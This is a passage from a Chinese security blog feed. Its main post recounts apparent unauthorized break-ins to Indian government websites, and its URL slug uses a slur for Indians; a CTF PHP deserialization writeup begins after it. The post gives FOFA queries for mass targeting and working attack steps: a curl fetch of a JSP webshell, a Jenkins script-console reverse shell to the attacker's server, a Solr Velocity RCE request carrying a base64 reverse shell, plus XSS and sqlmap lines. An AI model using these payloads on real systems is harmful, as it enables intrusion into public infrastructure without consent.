+<h2 id="0x01-信息收集阶段"><a class="markdownIt-Anchor" href="#0x01-信息收集阶段"></a> 0x01、信息收集阶段</h2>
+<p>==注：本次信息收集过程主要使用FOFA网络探测平台 <a href="https://fofa.info/===">https://fofa.info/===</a></p>
+<p>一开始进行收集的时候，有点迷，直接进行了大面积的&quot;<a href="http://gov.in">gov.in</a>&quot;域名收集</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">host=&quot;gov.in&quot; &amp;&amp; country=&quot;IN&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711021949594.png" alt="image-20230711021949594"></p>
+<p>哈哈68465条数据，想想就起飞，但是有个问题来了，怎么下载到本地，高级用户的API也只能调用下载1w条数据，左思右想<img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711022232842.png" alt="image-20230711022232842"></p>
+<p>试着写了个脚本看看：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pythonfofa</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;IN_domain.csv&quot;</span></span><br><span class="line"></span><br><span class="line">email = <span class="string">&#x27;u_mail&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;u_API_KEY&#x27;</span></span><br><span class="line">search = pythonfofa.Client(email, key)</span><br><span class="line">get_data = search.search(<span class="string">&#x27;host=&quot;gov.in&quot; &amp;&amp; country=&quot;IN&quot;&#x27;</span>, size=<span class="number">70000</span>)</span><br><span class="line"><span class="comment"># print(get_data)</span></span><br><span class="line"></span><br><span class="line">requests = [result[<span class="number">1</span>] <span class="keyword">for</span> result <span class="keyword">in</span> get_data[<span class="string">&#x27;results&#x27;</span>]]</span><br><span class="line"><span class="built_in">print</span>(requests)</span><br><span class="line"><span class="comment"># 打开CSV文件并设置写入模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历请求列表</span></span><br><span class="line">    <span class="keyword">for</span> request <span class="keyword">in</span> requests:</span><br><span class="line">        <span class="comment"># 在控制台打印域名</span></span><br><span class="line">        <span class="built_in">print</span>(request)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测域名是否包含&quot;http://&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> request.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">            <span class="comment"># 如果不包含，则在域名前添加&quot;http://&quot;</span></span><br><span class="line">            request = <span class="string">&quot;http://&quot;</span> + request</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在域名后添加斜杠&quot;/&quot;</span></span><br><span class="line">        request += <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将请求和值&quot;1&quot;作为一行写入CSV文件</span></span><br><span class="line">        writer.writerow([request, <span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+<p>是的，肯定不能跑，下断点，调试看看</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711024218564.png" alt="image-20230711024218564"></p>
+<p>很好确实是不能直接干7w条，换个收集思路，收集主流框架进行相应的漏扫</p>
+<p>主流框架的相关漏洞的FOFA规则语句：</p>
+<p><strong>Fastjson</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app=&quot;Fastjson&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
+<p><strong>Struts2</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app=&quot;Struts&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
+<p><strong>Log4j2</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(app=&quot;Log4j2&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;))</span><br></pre></td></tr></table></figure>
+<p>其他的也都大同小异，照葫芦画瓢就行。</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025300355.png" alt="image-20230711025300355"></p>
+<p>目标站点收集差不多了，就是漏洞探测阶段了。</p>
+<h2 id="0x02-漏洞探测及利用"><a class="markdownIt-Anchor" href="#0x02-漏洞探测及利用"></a> 0x02、漏洞探测及利用</h2>
+<h3 id="struts2"><a class="markdownIt-Anchor" href="#struts2"></a> Struts2：</h3>
+<p>直接掏出大范围漏扫AWVS就行批量漏洞探测：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025640689.png" alt="image-20230711025640689"></p>
+<p>第一天数据就直接起飞，因为本次目标是<mark>getshell</mark>直接忽略中低危漏洞告警，查看高危漏洞：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025838442.png" alt="image-20230711025838442"></p>
+<p>很好一堆<mark>Struts2</mark>漏洞，直接上工具：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711030506931.png" alt="image-20230711030506931"></p>
+<p>得到一个RCE（远程命令执行漏洞），远程写入<mark>shell</mark>，先利用工具生成一个<mark>Antsword(蚁剑)jsp格式的shell</mark></p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711030808818.png" alt="image-20230711030808818"></p>
+<p>将shell放到一个公网服务器上，接着执行命令查看web路径：<code>/var/tomcat9/pmrportal/ROOT/</code></p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711031350331.png" alt="image-20230711031350331"></p>
+<p>直接执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /var/tomcat9/pmrportal/ROOT/shell.jsp http://u_ip/antsword.jsp</span><br></pre></td></tr></table></figure>
+<p>然后webshell工具Antsword连接即可：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711031634840.png" alt="image-20230711031634840"></p>
+<p>爆出的该S2-045的漏洞的还有几个，getshell方式同上，不进行细述了___________________________________。</p>
+<h3 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> Weblogic：</h3>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025901659.png" alt="image-20230711025901659"></p>
+<p>很好用的awvs，直接上工具注入内存马：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713175036472.png" alt="image-20230713175036472"></p>
+<p>冰蝎连接webshell：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713175143564.png" alt="image-20230713175143564"></p>
+<p>同类型的漏洞还有几个，getshell的方式都一致，不一一概述了》》</p>
+<p>（PS：这个时候已经有些疲软了，没有去手测upload的点）</p>
+<h3 id="jenkins"><a class="markdownIt-Anchor" href="#jenkins"></a> Jenkins：</h3>
+<p>中途其他框架没有收获的时候，就去浏览知识的海洋了，看到一个存在大量未授权+RCE的框架漏洞（<strong>Jenkins</strong>），二话不说，直接上FOFA：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(app=&quot;JENKINS&quot; &amp;&amp; title==&quot;Dashboard [Jenkins]&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot;) &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713220128955.png" alt="image-20230713220128955"></p>
+<p>一看86条资产，有戏，数量不多，直接手测：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713180849084.png" alt="image-20230713180849084"></p>
+<p>存在未授权，访问manager --&gt; script页面，进行命令执行测试：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181156856.png" alt="image-20230713181156856"></p>
+<p>存在命令执行，尝试反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1&quot;.execute().text</span><br></pre></td></tr></table></figure>
+<p>接收shell的服务器开启端口监听：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181947756.png" alt="image-20230713181947756"></p>
+<p>执行命令</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181823099.png" alt="image-20230713181823099"></p>
+<p>发现没有shell反弹过来，猜测不能在web端执行反弹shell，于是将反弹shell的命令写入.sh文件中，然后执行，进行反弹shell操作：</p>
+<p>在sh文件中写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>保存在开放的web端口，在jenkins服务中执行如下curl命令远程下载sh文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">println <span class="string">&quot;curl - o /tmp/jenkins.sh http://u_ip:port/jenkins.sh&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713182926953.png" alt="image-20230713182926953"></p>
+<p>查看.sh文件是否获取成功：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;ls -al /tmp&quot;.execute().text</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183110423.png" alt="image-20230713183110423"></p>
+<p>获取.sh文件成功，执行文件，反弹shell：</p>
+<p>开启监听：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183406307.png" alt="image-20230713183406307"></p>
+<p>执行命令，启动.sh文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;bash /tmp/jenkins.sh&quot;.execute().text</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183606528.png" alt="image-20230713183606528"></p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183513017.png" alt="image-20230713183513017"></p>
+<p>成功监听到谈过来的shell，又拿下一台！其他的没有存在未授权，便没有尝试。</p>
+<h3 id="apache-solr"><a class="markdownIt-Anchor" href="#apache-solr"></a> Apache-Solr</h3>
+<p>闲着没事，打开文库看了几篇RCE复现，心血来潮，打开FOFA：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">country=<span class="string">&quot;IN&quot;</span> &amp;&amp; app=<span class="string">&quot;Apache-Solr&quot;</span> &amp;&amp; status_code=<span class="string">&quot;200&quot;</span> &amp;&amp; (port=<span class="string">&quot;443&quot;</span> || port=<span class="string">&quot;80&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719101927146.png" alt="image-20230719101927146"></p>
+<p>数据不大，接着手测，拿到三个未授权(不需要登陆)：</p>
+<p><mark>授权</mark>：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102234003.png" alt="image-20230719102234003"></p>
+<p><mark>未授权</mark>：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102331665.png" alt="image-20230719102331665"></p>
+<p>拿到未授权之后，进行CVE探测：</p>
+<p>访问<code>/solr/admin/cores/</code>，获取<code>name =&gt; music</code></p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102848788.png" alt="image-20230719102848788"></p>
+<p>接着拼接路径<code>/solr/music/config/</code>查看用户配置信息：</p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719103210432.png" alt="image-20230719103210432"></p>
+<p>都为<code>true</code>，可直接利用公网披露的payload进行RCE，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /solr/music/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%22whoami%22))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end HTTP/1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115129111.png" alt="image-20230719115129111"></p>
+<p>测试是否出网：</p>
+<p>修改执行命令为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl%20xtolsc.dnslog.cn</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115425835.png" alt="image-20230719115425835"></p>
+<p>可出网，直接反弹shell：</p>
+<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/music/select?q=<span class="number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="meta">%23set</span>(<span class="variable">$x</span>=<span class="meta">%27</span><span class="meta">%27</span>)+<span class="meta">%23set</span>(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Runtime<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Character<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.String<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().exec(<span class="meta">%22bash</span><span class="meta">%20-c</span><span class="meta">%20</span><span class="meta">%7Becho</span><span class="meta">%2CYmFzaCAtaSA</span><span class="meta">%2BJiAvZGV2xxxxxx8xMDEuNDMuMTM5LjI0My81MDAwIDA</span><span class="meta">%2BJjE</span><span class="meta">%3D</span><span class="meta">%7D</span><span class="meta">%7C</span><span class="meta">%7Bbase64</span><span class="meta">%2C-d</span><span class="meta">%7D</span><span class="meta">%7C</span><span class="meta">%7Bbash</span><span class="meta">%2C-i</span><span class="meta">%7D</span><span class="meta">%22</span>))+<span class="variable">$ex</span>.waitFor()+<span class="meta">%23set</span>(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+<span class="meta">%23foreach</span>(<span class="variable">$i</span>+<span class="keyword">in</span>+[<span class="number">1</span>..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.read()))<span class="meta">%23end</span>  HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip</span><br><span class="line">accept: */*</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0</span>.<span class="number">0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>VPS开启端口监听：<code>nc -lvvnp 5000</code></p>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115817964.png" alt="image-20230719115817964"></p>
+<p>接听到弹过来的shell了，好，又拿下一台，root权限。</p>
+<h3 id="其他漏洞发现"><a class="markdownIt-Anchor" href="#其他漏洞发现"></a> 其他漏洞发现</h3>
+<h4 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss"></a> 反射型XSS</h4>
+<p>具体测试过程均无任何难度，无须bypass黑名单之类的，测试语句</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230726182631855.png" alt="image-20230726182631855"></p>
+<h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h4>
+<p>这类没有具体测试，发现注入点之后直接上SQLmap开扫：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap https://******.gov.in/****/Validate.jsp --data <span class="string">&quot;email=a@a.com&amp;password=123456&quot;</span> --random-agent -t 10 -p password --proxy=http://127.0.0.1:7890 --dbms=mysql</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230726183935140.png" alt="image-20230726183935140"></p>
+<h2 id="渗透总结"><a class="markdownIt-Anchor" href="#渗透总结"></a> 渗透总结</h2>
+<p>本次测试周期长，测试目标暴露点多，非常有趣的一次渗透实战，后期有其他事儿，就没法全身心投入，蛮可惜的。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝桥杯CTF-ezphp-Wirteup</title>
+    <url>/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/</url>
+    <content><![CDATA[<p>emm一道蛮有意思的反序列化，链子不长，很好构建，入口和出口都很好找，重点就是如何bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code>，还有就是写了几个小时，特意写个wp记录一下<img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230603181156418.png" alt="image-20230603181156418"></p>
+<span id="more"></span>
+<h1 id="蓝桥杯ctf-ezphp-wirteup"><a class="markdownIt-Anchor" href="#蓝桥杯ctf-ezphp-wirteup"></a> 蓝桥杯CTF-ezphp-Wirteup</h1>
+<h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h2>
+<p>在刚学习php开发的阶段，程序员们常常会忽略对用户输入数据的正确验证和过滤，这往往会给程序带来严重的安全隐患。因为未经验证和过滤的用户输入数据可能包含恶意代码或者非法字符，这些数据一旦被程序所接受并处理，就会导致程序出现各种漏洞。（ps：哈哈哈哈很蓝桥）</p>
+<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
+<h3 id="0x01-构造反序列化pop链"><a class="markdownIt-Anchor" href="#0x01-构造反序列化pop链"></a> 0x01、构造反序列化POP链</h3>
+<p>下发容器，看了一下网页源码，看到底部存在提示<code>header ?</code>，bp抓包看了一下</p>
+<p><img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230603182704348.png" alt="image-20230603182704348"></p>
+<p>给了题目所在的目录<code>admin3ecr3t.php</code>，访问得到了源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;00&quot;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以一眼就能看到我们需要的东西在<code>classA</code>中</p>
